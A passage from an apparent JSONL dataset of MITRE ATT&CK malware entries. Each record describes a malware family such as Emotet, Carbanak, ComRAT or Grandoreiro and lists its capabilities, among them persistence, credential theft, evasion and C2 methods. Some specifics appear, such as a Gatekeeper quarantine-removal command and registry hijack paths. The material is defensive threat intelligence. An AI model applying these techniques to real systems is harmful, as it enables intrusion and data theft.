"gh0st RAT has altered the InstallTime subkey.", "gh0st RAT can create a new service to establish persistence.", "gh0st RAT uses RC4 and XOR to encrypt C2 traffic.", "gh0st RAT has used an encrypted protocol within TCP segments to communicate with the C2.", "gh0st RAT has decrypted and loaded the gh0st RAT DLL into memory, once the initial dropper executable is launched.", "gh0st RAT\thas encrypted TCP communications to evade detection.", "gh0st RAT can load DLLs into memory.", "gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.", "gh0st RAT is able to open a remote shell to execute commands.", "A gh0st RAT variant has used rundll32 for execution.", "gh0st RAT can capture the victim’s screen remotely."], "is_subtechnique": false}
{"text": " [SHARPSTATS](https://attack.mitre.org/software/S0450) is a .NET backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069) since at least 2019.(Citation: TrendMicro POWERSTATS V3 June 2019)", "idx": "https://attack.mitre.org/software/S0450", "title": "SHARPSTATS", "entity": "SHARPSTATS", "entity_type": "software", "entity_context": ["SHARPSTATS has the ability to employ a custom PowerShell script.", "SHARPSTATS has the ability to identify the current date and time on the compromised host.", "SHARPSTATS has the ability to upload and download files.", "SHARPSTATS has the ability to identify the domain of the compromised host.", "SHARPSTATS has the ability to identify the IP address, machine name, and OS of the compromised host.", "SHARPSTATS has used base64 encoding and XOR to obfuscate PowerShell scripts.", "SHARPSTATS has the ability to identify the username on the compromised host."], "is_subtechnique": false}
{"text": " [PowerStallion](https://attack.mitre.org/software/S0393) is a lightweight [PowerShell](https://attack.mitre.org/techniques/T1059/001) backdoor used by [Turla](https://attack.mitre.org/groups/G0010), possibly as a recovery access tool to install other backdoors.(Citation: ESET Turla PowerShell May 2019)", "idx": "https://attack.mitre.org/software/S0393", "title": "PowerStallion", "entity": "PowerStallion", "entity_type": "software", "entity_context": ["PowerStallion uses a XOR cipher to encrypt command output written to its OneDrive C2 server.", "PowerStallion modifies the MAC times of its local log files to match that of the victim's desktop.ini file.", "PowerStallion uses Microsoft OneDrive as a C2 server via a network drive mapped with <code>net use</code>.", "PowerStallion uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.", "PowerStallion has been used to monitor process lists."], "is_subtechnique": false}
{"text": " [Avenger](https://attack.mitre.org/software/S0473) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)", "idx": "https://attack.mitre.org/software/S0473", "title": "Avenger", "entity": "Avenger", "entity_type": "software", "entity_context": ["Avenger has the ability to identify the host volume ID and the OS architecture on a compromised host.", "Avenger can identify the domain of the compromised host.", "Avenger has the ability to inject shellcode into svchost.exe.", "Avenger has the ability to use HTTP in communication with C2.", "Avenger has the ability to use Tasklist to identify running processes.", "Avenger has the ability to download files from C2 to a compromised host.", "Avenger has the ability to decrypt files downloaded from C2.", "Avenger has the ability to identify installed anti-virus products on a compromised host.", "Avenger has the ability to XOR encrypt files to be sent to C2.", "Avenger has the ability to browse files in directories such as Program Files and the Desktop. ", "Avenger can extract backdoor malware from downloaded images."], "is_subtechnique": false}
{"text": " [FrameworkPOS](https://attack.mitre.org/software/S0503) is a point of sale (POS) malware used by [FIN6](https://attack.mitre.org/groups/G0037) to steal payment card data from sytems that run physical POS devices.(Citation: SentinelOne FrameworkPOS September 2019)", "idx": "https://attack.mitre.org/software/S0503", "title": "FrameworkPOS", "entity": "FrameworkPOS", "entity_type": "software", "entity_context": ["FrameworkPOS can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.", "FrameworkPOS can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows\\.", "FrameworkPOS can collect elements related to credit card data from process memory.", "FrameworkPOS can XOR credit card information before exfiltration.", "FrameworkPOS can use DNS tunneling for exfiltration of credit card data."], "is_subtechnique": false}
{"text": " [Goopy](https://attack.mitre.org/software/S0477) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050) and shares several similarities to another backdoor used by the group ([Denis](https://attack.mitre.org/software/S0354)). [Goopy](https://attack.mitre.org/software/S0477) is named for its impersonation of the legitimate Google Updater executable.(Citation: Cybereason Cobalt Kitty 2017)", "idx": "https://attack.mitre.org/software/S0477", "title": "Goopy", "entity": "Goopy", "entity_type": "software", "entity_context": ["Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.", "Goopy has the ability to disable Microsoft Outlook's security policies to disable macro warnings.\t", "Goopy has the ability to exfiltrate documents from infected systems.\t", "Goopy has the ability to delete emails used for C2 once the content has been copied.\t", "Goopy has the ability to exfiltrate data over the Microsoft Outlook C2 channel.", "Goopy has used a polymorphic decryptor to decrypt itself at runtime.", "Goopy has had null characters padded in its malicious DLL payload.", "Goopy has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.", "Goopy has the ability to  enumerate the infected system's user name via <code>GetUserNameW</code>.", "Goopy has the ability to enumerate the infected system's user name.", "Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.\t", "Goopy has checked for the Google Updater process to ensure Goopy was loaded properly.", "Goopy has the ability to communicate with its C2 over DNS.\t", "Goopy has the ability to maintain persistence by creating scheduled tasks set to run every hour.\t", "Goopy has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.\t", "Goopy has the ability to side-load malicious DLLs with legitimate applications from Kaspersky, Microsoft, and Google.", "Goopy has the ability to communicate with its C2 over HTTP.\t"], "is_subtechnique": false}
{"text": " [Denis](https://attack.mitre.org/software/S0354) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050). [Denis](https://attack.mitre.org/software/S0354) shares several similarities to the [SOUNDBITE](https://attack.mitre.org/software/S0157) backdoor and has been used in conjunction with the [Goopy](https://attack.mitre.org/software/S0477) backdoor.(Citation: Cybereason Oceanlotus May 2017)", "idx": "https://attack.mitre.org/software/S0354", "title": "Denis", "entity": "Denis", "entity_type": "software", "entity_context": ["Denis has a version written in PowerShell.\t", "Denis encodes the data sent to the server in Base64.", "Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.", "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.", "Denis uses <code>ipconfig</code> to gather the IP address from the system.", "Denis used the <code>IsDebuggerPresent</code>, <code>OutputDebugString</code>, and <code>SetLastError</code> APIs to avoid debugging. Denis used <code>GetProcAddress</code> and <code>LoadLibrary</code> to dynamically resolve APIs. Denis also used the <code>Wow64SetThreadContext</code> API as part of a process hollowing process.\t", "Denis can launch a remote shell to execute arbitrary commands on the victim’s machine.", "Denis collects OS information and the computer name from the victim’s machine.", "Denis will decrypt important strings used for C&C communication.", "Denis queries the Registry for keys and values.", "Denis compressed collected data using zlib.", "Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.", "Denis deploys additional backdoors and hacking tools to the system.", "Denis enumerates and collects the username from the victim’s machine.", "Denis obfuscates its code and encrypts the API names. Denis also encodes its payload in Base64.", "Denis exploits a security vulnerability to load a fake DLL and execute its code.", "Denis has a command to delete files from the victim’s machine.", "Denis has used DNS tunneling for C2 communications.", "Denis has several commands to search directories for files."], "is_subtechnique": false}
{"text": " [Reaver](https://attack.mitre.org/software/S0172) is a malware family that has been in the wild since at least late 2016. Reporting indicates victims have primarily been associated with the \"Five Poisons,\" which are movements the Chinese government considers dangerous. The type of malware is rare due to its final payload being in the form of [Control Panel](https://attack.mitre.org/techniques/T1218/002) items.(Citation: Palo Alto Reaver Nov 2017)", "idx": "https://attack.mitre.org/software/S0172", "title": "Reaver", "entity": "Reaver", "entity_type": "software", "entity_context": ["Reaver queries the Registry to determine the correct Startup path to use for persistence.", "Reaver collects the victim's IP address.", "Reaver encrypts some of its files with XOR.", "Reaver drops and executes a malicious CPL file as its payload.", "Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.", "Reaver deletes the original dropped file from the victim.", "Reaver installs itself as a new service.", "Some Reaver variants use raw TCP for C2.", "Reaver encrypts collected data with an incremental XOR key prior to exfiltration.", "Reaver collects the victim's username.", "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.", "Some Reaver variants use HTTP for C2."], "is_subtechnique": false}
{"text": " [RawPOS](https://attack.mitre.org/software/S0169) is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008. (Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa RawPOS March 2015) FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)", "idx": "https://attack.mitre.org/software/S0169", "title": "RawPOS", "entity": "RawPOS", "entity_type": "software", "entity_context": ["RawPOS installs itself as a service to maintain persistence.", "New services created by RawPOS are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".", "RawPOS encodes credit card data it collected from the victim with XOR.", "RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.", "Data captured by RawPOS is placed in a temporary file under a directory named \"memdump\"."], "is_subtechnique": false}
{"text": " [HOMEFRY](https://attack.mitre.org/software/S0232) is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other [Leviathan](https://attack.mitre.org/groups/G0065) backdoors. (Citation: FireEye Periscope March 2018)", "idx": "https://attack.mitre.org/software/S0232", "title": "HOMEFRY", "entity": "HOMEFRY", "entity_type": "software", "entity_context": ["HOMEFRY uses a command-line interface.", "Some strings in HOMEFRY are obfuscated with XOR x56.", "HOMEFRY can perform credential dumping."], "is_subtechnique": false}
{"text": " [AuditCred](https://attack.mitre.org/software/S0347) is a malicious DLL that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) during their 2018 attacks.(Citation: TrendMicro Lazarus Nov 2018)", "idx": "https://attack.mitre.org/software/S0347", "title": "AuditCred", "entity": "AuditCred", "entity_type": "software", "entity_context": ["AuditCred can utilize proxy for communications.", "AuditCred can search through folders and files on the system.", "AuditCred can open a reverse shell on the system to execute commands.", "AuditCred has used Port Number 443 for C2 communications.", "AuditCred can inject code from files to other running processes.", "AuditCred uses XOR and RC4 to perform decryption on the code functions.", "AuditCred can download files and additional malware.", "AuditCred is installed as a new service on the system.", "AuditCred can delete files from the system.", "AuditCred encrypts the configuration."], "is_subtechnique": false}
{"text": " [ComRAT](https://attack.mitre.org/software/S0126) is a second stage implant suspected of being a descendant of [Agent.btz](https://attack.mitre.org/software/S0092) and used by [Turla](https://attack.mitre.org/groups/G0010). The first version of [ComRAT](https://attack.mitre.org/software/S0126) was identified in 2007, but the tool has undergone substantial development for many years since.(Citation: Symantec Waterbug)(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT May 2020)", "idx": "https://attack.mitre.org/software/S0126", "title": "ComRAT", "entity": "ComRAT", "entity_type": "software", "entity_context": ["ComRAT can check the victim's default browser to determine which process to inject its communications module into.", "ComRAT has the ability to use the Gmail web UI to receive commands and exfiltrate information.", "ComRAT has used HTTP requests for command and control.", "ComRAT can use SSL/TLS encryption for its HTTP-based C2 channel. ComRAT has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel. ", "ComRAT has used a task name associated with Windows SQM Consolidator.", "ComRAT has used <code>cmd.exe</code> to execute commands.", "ComRAT has used a scheduled task to launch its PowerShell loader.", "ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also embedded an XOR encrypted communications module inside the orchestrator module. ComRAT has encrypted its virtual file system using AES-256 in XTS mode and has encoded PowerShell scripts. ", "ComRAT can load a PE file from memory or the file system and execute it with <code>CreateProcessW</code>.", "ComRAT has encrypted and stored its orchestrator code in the Registry as well as a PowerShell script into the WsqmCons Registry key. ", "ComRAT has used PowerShell to load itself every time a user logs in to the system. ComRAT can execute PowerShell scripts loaded into memory or from the file system.", "ComRAT can check the default browser by querying <code>HKCR\\http\\shell\\open\\command</code>.", "ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system.", "ComRAT has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday). ", "ComRAT has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.", "ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).", "ComRAT can use email attachments for command and control.", "ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location <code>HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32</code>.", "ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process."], "is_subtechnique": false}
{"text": " [Carberp](https://attack.mitre.org/software/S0484) is a credential and information stealing malware that has been active since at least 2009. [Carberp](https://attack.mitre.org/software/S0484)'s source code was leaked online in 2013, and subsequently used as the foundation for the [Carbanak](https://attack.mitre.org/software/S0030) backdoor.(Citation: Trend Micro Carberp February 2014)(Citation: KasperskyCarbanak)(Citation: RSA Carbanak November 2017)", "idx": "https://attack.mitre.org/software/S0484", "title": "Carberp", "entity": "Carberp", "entity_type": "software", "entity_context": ["Carberp has used user mode rootkit techniques to remain hidden on the system.", "Carberp's bootkit can inject a malicious DLL into the address space of running processes.", "Carberp has created a hidden file in the Startup folder of the current user.", "Carberp has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.", "Carberp has queried the infected system's registry searching for specific registry keys associated with antivirus products.", "Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.", "Carberp's passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome.", "Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread.", "Carberp can download and execute new plugins from the C2 server. ", "Carberp has collected a list of running processes.", "Carberp has installed a bootkit on the system to maintain persistence.", "Carberp has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.", "Carberp has hooked several Windows API functions to steal credentials.", "Carberp has searched the Image File Execution Options registry key for \"Debugger\" within every subkey.", "Carberp has used XOR-based encryption to mask C2 server locations within the trojan.", "Carberp has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.", "Carberp has exfiltrated data via HTTP to already established C2 servers.", "Carberp has captured credentials when a user performs login through a SSL session.", "Carberp can start a remote VNC session by downloading a new plugin.", "Carberp has collected the operating system version from the infected system.", "Carberp can capture display screenshots with the screens_dll.dll plugin.", "Carberp has maintained persistence by placing itself inside the current user's startup folder.", "Carberp has connected to C2 servers via HTTP.", "Carberp has masqueraded as Windows system file names, as well as \"chkntfs.exe\" and \"syscron.exe\".", "Carberp's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients."], "is_subtechnique": false}
{"text": " [Grandoreiro](https://attack.mitre.org/software/S0531) is a banking trojan written in Delphi that was first observed in 2016 and uses a Malware-as-a-Service (MaaS) business model. [Grandoreiro](https://attack.mitre.org/software/S0531) has confirmed victims in Brazil, Mexico, Portugal, and Spain.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020)", "idx": "https://attack.mitre.org/software/S0531", "title": "Grandoreiro", "entity": "Grandoreiro", "entity_type": "software", "entity_context": ["Grandoreiro can detect VMWare via its I/O port and Virtual PC via the <code>vpcext</code> instruction.", "Grandoreiro can bypass UAC by registering as the default handler for .MSC files.", "Grandoreiro can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections.", "Grandoreiro can use VBScript to execute malicious code.", "Grandoreiro can use malicious browser extensions to steal cookies and other user information.", "Grandoreiro can use SSL in C2 communication.", "Grandoreiro can decrypt its encrypted internal strings.", "Grandoreiro can steal cookie data and credentials from Google Chrome.", "Grandoreiro can execute through the <code>WinExec</code> API.", "Grandoreiro has used compromised websites and Google Ads to bait victims into downloading its installer.", "Grandoreiro can store its configuration in the Registry at <code>HKCU\\Software\\</code> under frequently changing names including <code>%USERNAME%</code> and <code>ToolTech-RM</code>.", "Grandoreiro can download its second stage from a hardcoded URL within the loader's code.", "Grandoreiro has used malicious links to gain execution on victim machines.", "Grandoreiro has named malicious browser extensions and update files to appear legitimate.", "Grandoreiro can modify the binary ACL to prevent security tools from running.", "Grandoreiro can send data it retrieves to the C2 server.", "Grandoreiro has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.", "Grandoreiro has been spread via malicious links embedded in e-mails.", "Grandoreiro can utilize web services including Google sites to send and receive C2 data.", "Grandoreiro can use run keys and create link files in the startup folder for persistence.", "Grandoreiro can delete .LNK files created in the Startup folder.", "Grandoreiro has the ability to use HTTP in C2 communications.", "Grandoreiro can use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily.", "Grandoreiro can identify installed security tools based on process names.", "The Grandoreiro payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.", "Grandoreiro can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.", "Grandoreiro can steal the victim's cookies to use for duplicating the active session from another device.", "Grandoreiro can collect the computer name and OS version from a compromised host.", "Grandoreiro can collect the username from the victim's machine.", "Grandoreiro can use MSI files to execute DLLs.", "Grandoreiro can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.", "Grandoreiro can determine the time on the victim machine via IPinfo.", "Grandoreiro can log keystrokes on the victim's machine.", "Grandoreiro can determine the IP and physical location of the compromised host via IPinfo.", "Grandoreiro can capture clipboard data from a compromised host.", "Grandoreiro has infected victims via malicious attachments.", "Grandoreiro can write or modify browser shortcuts to enable launching of malicious browser extensions. ", "Grandoreiro can obtain C2 information from Google Docs.", "Grandoreiro can parse Outlook .pst files to extract e-mail addresses.", "Grandoreiro can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.", "Grandoreiro can identify installed security tools based on window names."], "is_subtechnique": false}
{"text": " [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) is a MacOS backdoor with several variants that has been used by [APT32](https://attack.mitre.org/groups/G0050).(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020)", "idx": "https://attack.mitre.org/software/S0352", "title": "OSX_OCEANLOTUS.D", "entity": "OSX_OCEANLOTUS.D", "entity_type": "software", "entity_context": ["OSX_OCEANLOTUS.D uses a shell script as the main executable inside an app bundle and drops an embedded base64-encoded payload to the <code>/tmp</code> folder.", "OSX_OCEANLOTUS.D has the ability to upload files from a compromised host.", "OSX_OCEANLOTUS.D has changed permissions of a second-stage payload to an executable via <code>chmod</code>.", "OSX_OCEANLOTUS.D uses the command <code>xattr -d com.apple.quarantine</code> to remove the quarantine file attribute used by Gatekeeper and Notarization checks.", "OSX_OCEANLOTUS.D can use HTTP POST and GET requests to send and receive C2 information.", "If running with <code>root</code> permissions, OSX_OCEANLOTUS.D can create a persistence file in the folder <code>/Library/LaunchDaemons</code>.", "OSX_OCEANLOTUS.D has disguised its app bundle by adding special characters to the filename and using the icon for legitimate Word documents.", "OSX_OCEANLOTUS.D scrambles and encrypts data using AES256 before sending it to the C2 server.", "OSX_OCEANLOTUS.D has a command to download and execute a file on the victim’s machine.", "OSX_OCEANLOTUS.D uses Word macros for execution.", "OSX_OCEANLOTUS.D collects processor information, memory information, computer name, hardware UUID, serial number, and operating system version. OSX_OCEANLOTUS.D has used the <code>ioreg</code> command to gather some of this information.", "OSX_OCEANLOTUS.D has a variant that is packed with UPX.", "OSX_OCEANLOTUS.D encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.", "OSX_OCEANLOTUS.D can create a persistence file in the folder <code>/Library/LaunchAgents</code>.", "OSX_OCEANLOTUS.D has variants that check a number of system parameters to see if it is being run on real hardware or in a virtual machine environment, such as <code>sysctl hw.model</code>.", "OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.", "OSX_OCEANLOTUS.D sets the main loader file’s attributes to hidden.", "OSX_OCEANLOTUS.D uses PowerShell scripts.", "OSX_OCEANLOTUS.D can use the <code>touch -t</code> command to change timestamps.", "OSX_OCEANLOTUS.D has a command to delete a file from the system. OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution."], "is_subtechnique": false}
{"text": " [Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "idx": "https://attack.mitre.org/software/S0367", "title": "Emotet", "entity": "Emotet", "entity_type": "software", "entity_context": ["Emotet has been seen exfiltrating system information stored within cookies sent within an HTTP GET request back to its C2 servers. ", "Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz. ", "Emotet has used ports 20, 22, 80, 443, 8080, and 8443.", "Emotet has relied upon users clicking on a malicious attachment delivered through spearphishing.", "Emotet has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.  ", "Emotet has relied upon users clicking on a malicious link delivered through spearphishing.", "Emotet can brute force a local admin password, then use it to facilitate lateral movement.", "Emotet has been observed using a hard coded list of passwords to brute force user accounts.  ", "Emotet has been observed leveraging a module that can scrape email addresses from Outlook.", "Emotet has used HTTP over ports such as 20, 22, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.", "Emotet has been observed creating new services to maintain persistence.  ", "Emotet has been observed dropping password grabber modules including Mimikatz. ", "Emotet has maintained persistence through a scheduled task. ", "Emotet is known to use RSA keys for encrypting C2 traffic. ", "Emotet has been observed to hook network APIs to monitor network traffic. ", "Emotet has been observed injecting in to Explorer.exe and other processes. ", "Emotet has been observed enumerating local processes.", "Emotet has been observed encrypting the data it collects before sending it to the C2 server. ", "Emotet has been observed dropping browser password grabber modules. ", "Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts. ", "Emotet has been observed leveraging a module that scrapes email data from Outlook.", "Emotet has used cmd.exe to run a PowerShell script. ", "Emotet has been delivered by phishing emails containing links. ", "Emotet has been observed adding the downloaded payload to the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key to maintain persistence.", "Emotet has been delivered by phishing emails containing attachments. ", "Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. ", "Emotet has used custom packers to protect its payloads.", "Emotet leverages the Admin$ share for lateral movement once the local admin password has been brute forced.  ", "Emotet has used WMI to execute powershell.exe.", "Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. "], "is_subtechnique": false}
{"text": " [Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is intended for espionage, data exfiltration, and providing remote access to infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)", "idx": "https://attack.mitre.org/software/S0030", "title": "Carbanak", "entity": "Carbanak", "entity_type": "software", "entity_context": ["Carbanak has a command to delete files.", "Carbanak uses Port Numbers 443 and 80 for the C2 server.", "Carbanak has a command to create a reverse shell.", "Carbanak checks the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code> for proxy configurations information.", "Carbanak performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.", "Carbanak has a plugin for VNC and Ammyy Admin Tool.", "Carbanak downloads an executable and injects it directly into a new process.", "Carbanak encrypts strings to make analysis more difficult.", "Carbanak stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.", "Carbanak encodes the message body of HTTP traffic with Base64.", "Carbanak encrypts the message body of HTTP traffic with RC2 (in CBC mode). Carbanak also uses XOR with random keys for its communications.", "Carbanak obtains Windows logon password details.", "The Carbanak malware communicates to its command server using HTTP with an encrypted payload.", "Carbanak logs key strokes for configured processes and sends them back to the C2 server.", "Carbanak lists running processes.", "Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes .", "Carbanak enables concurrent Remote Desktop Protocol (RDP) sessions.", "Carbanak searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.", "Carbanak can create a Windows account."], "is_subtechnique": false}
{"text": " [HotCroissant](https://attack.mitre.org/software/S0431) is a remote access trojan (RAT) attributed by U.S. government entities to malicious North Korean government cyber activity, tracked collectively as HIDDEN COBRA.(Citation: US-CERT HOTCROISSANT February 2020) [HotCroissant](https://attack.mitre.org/software/S0431) shares numerous code similarities with [Rifdoor](https://attack.mitre.org/software/S0433).(Citation: Carbon Black HotCroissant April 2020)", "idx": "https://attack.mitre.org/software/S0431", "title": "HotCroissant", "entity": "HotCroissant", "entity_type": "software", "entity_context": ["HotCroissant has the ability to clean up installed files, delete files, and delete itself from the victim’s machine.", "HotCroissant has the ability to collect the username on the infected host.", "HotCroissant has the ability to download files from the infected host to the command and control (C2) server.", "HotCroissant has the ability to stop services on the infected host.", "HotCroissant has the ability to list the names of all open windows on the infected host.", "HotCroissant has compressed network communications and encrypted them with a custom stream cipher.", "HotCroissant has attempted to install a scheduled task named “Java Maintenance64” on startup to establish persistence.", "HotCroissant has the ability to hide the window for operations performed on a given file.", "HotCroissant has the ability to list running processes on the infected host.", "HotCroissant has the ability to upload a file from the command and control (C2) server to the victim machine.", "HotCroissant has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.", "HotCroissant has encrypted strings with single-byte XOR and base64 encoded RC4.", "HotCroissant can retrieve a list of applications from the <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths</code> registry key.", "HotCroissant has the ability to identify the IP address of the compromised machine.", "HotCroissant has the ability to do real time screen viewing on an infected host.", "HotCroissant can remotely open applications on the infected host with the <code>ShellExecuteA</code> command.", "HotCroissant can perform dynamic DLL importing and API lookups using <code>LoadLibrary</code> and <code>GetProcAddress</code> on obfuscated strings.", "HotCroissant has the ability to retrieve a list of services on the infected host.", "HotCroissant has the ability to retrieve a list of files in a given directory as well as drives and drive types.", "HotCroissant has used the open source UPX executable packer."], "is_subtechnique": false}
{"text": " [SombRAT](https://attack.mitre.org/software/S0615) is a modular backdoor written in C++ that has been in use since at least 2019. [SombRAT](https://attack.mitre.org/software/S0615) has been used to download and execute malicious payloads, including [FIVEHANDS](https://attack.mitre.org/software/S0618) ransomware.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS May 2021)", "idx": "https://attack.mitre.org/software/S0615", "title": "SombRAT", "entity": "SombRAT", "entity_type": "software", "entity_context": ["SombRAT can execute <code>loadfromfile</code>, <code>loadfromstorage</code>, and <code>loadfrommem</code> to inject a DLL  from disk, storage, or memory respectively.", "SombRAT can use the <code>getprocesslist</code> command to enumerate processes on a compromised host.", "SombRAT can SSL encrypt C2 traffic.", "SombRAT has the ability to use an embedded SOCKS proxy in C2 communications.", "SombRAT can store harvested data in a custom database under the %TEMP% directory.", "SombRAT can execute <code>getinfo</code>  to identify the username on a compromised host.", " SombRAT has the ability to run <code>cancel</code> or <code>closeanddeletestorage</code> to remove all files from storage and delete the storage temp file on a compromised host.", "SombRAT can enumerate services on a victim machine.", "SombRAT can use a custom DGA to generate a subdomain for C2.", "SombRAT has collected data and files from a compromised host.", "SombRAT can run <code>upload</code> to decrypt and upload files from storage.", "SombRAT has the ability to respawn itself using <code>ShellExecuteW</code> and <code>CreateProcessW</code>.", "SombRAT can execute <code>getinfo</code> to enumerate the computer name and OS version of a compromised system.", "SombRAT can execute <code>enum</code> to enumerate files in storage on a compromised system.", "SombRAT can use a legitimate process name to hide itself.", "SombRAT can communicate over DNS with the C2 server.", "SombRAT can execute <code>getinfo</code>  to discover the current time on a compromised host.", "SombRAT has the ability to use TCP sockets to send data and ICMP to ping the C2 server.", "SombRAT has the ability to download and execute additional payloads.", "SombRAT can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data."], "is_subtechnique": false}
{"text": " [CORALDECK](https://attack.mitre.org/software/S0212) is an exfiltration tool used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0212", "title": "CORALDECK", "entity": "CORALDECK", "entity_type": "software", "entity_context": ["CORALDECK has created password-protected RAR, WinImage, and zip archives to be exfiltrated.", "CORALDECK searches for specified files.", "CORALDECK has exfiltrated data in HTTP POST headers."], "is_subtechnique": false}
{"text": " [TINYTYPHON](https://attack.mitre.org/software/S0131) is a backdoor that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm. (Citation: Forcepoint Monsoon)", "idx": "https://attack.mitre.org/software/S0131", "title": "TINYTYPHON", "entity": "TINYTYPHON", "entity_type": "software", "entity_context": ["TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.", "TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file.", "TINYTYPHON installs itself under Registry Run key to establish persistence.", "When a document is found matching one of the extensions in the configuration, TINYTYPHON uploads it to the C2 server."], "is_subtechnique": false}
